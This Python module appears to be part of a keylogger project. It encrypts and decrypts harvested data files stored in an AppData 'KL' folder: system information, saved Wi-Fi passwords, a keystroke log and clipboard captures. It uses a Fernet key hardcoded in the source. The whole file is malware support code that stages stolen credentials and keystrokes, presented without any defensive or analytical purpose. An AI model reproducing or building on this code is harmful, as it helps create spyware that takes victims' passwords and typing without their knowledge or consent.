from cryptography.fernet import Fernet
import os

# Configuration
screenshot_folder = os.path.join(os.environ['appdata'], "KL")
system_information = os.path.join(screenshot_folder, "systeminfo.txt")
wifi_password = os.path.join(screenshot_folder, "wifi_password.txt")
keys_information = os.path.join(screenshot_folder, "key_log.txt")
clipboard_pdf_file = os.path.join(screenshot_folder, "clipboard.pdf")
decryption_key = "cZr_KlOD_4jbrAU-c8ZIOqpI8K6lb-PFwm8xC3U5YbA="
fernet = Fernet(decryption_key)

# Files to encrypt and their corresponding encrypted names
files_to_encrypt = {
    system_information: "e_systeminfo.txt",
    wifi_password: "e_wifi_password.txt",
    keys_information: "e_key_log.txt",
    # clipboard_pdf_file: "e_clipboard.pdf",
}


def encrypt_files():
    """Encrypt files in the specified paths."""
    for file_path, encrypted_filename in files_to_encrypt.items():
        if os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)

                encrypted_file_path = os.path.join(screenshot_folder, encrypted_filename)
                with open(encrypted_file_path, 'wb') as ef:
                    ef.write(encrypted_data)

                print(f"Encrypted: {file_path} -> {encrypted_file_path}")
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")
        else:
            print(f"File not found for encryption: {file_path}")


def decrypt_files():
    """Decrypt files and save them with 'decrypted_' prefix."""
    decrypted_files = []

    for original_path, encrypted_filename in files_to_encrypt.items():
        encrypted_path = os.path.join(screenshot_folder, encrypted_filename)
        if os.path.exists(encrypted_path):
            try:
                with open(encrypted_path, 'rb') as f:
                    encrypted_data = f.read()

                decrypted_data = fernet.decrypt(encrypted_data)

                decrypted_filename = "decrypted_" + os.path.basename(original_path)
                decrypted_filepath = os.path.join(screenshot_folder, decrypted_filename)
                with open(decrypted_filepath, 'wb') as decrypted_file:
                    decrypted_file.write(decrypted_data)

                decrypted_files.append(decrypted_filepath)
                print(f"Decrypted: {encrypted_path} -> {decrypted_filepath}")
            except Exception as e:
                print(f"Error decrypting {encrypted_path}: {e}")
        else:
            print(f"File not found for decryption: {encrypted_path}")

    return decrypted_files


# Main execution (if needed to test directly)
if __name__ == "__main__":
    encrypt_files()
    decrypted_files = decrypt_files()
    print(f"Decrypted files: {decrypted_files}")
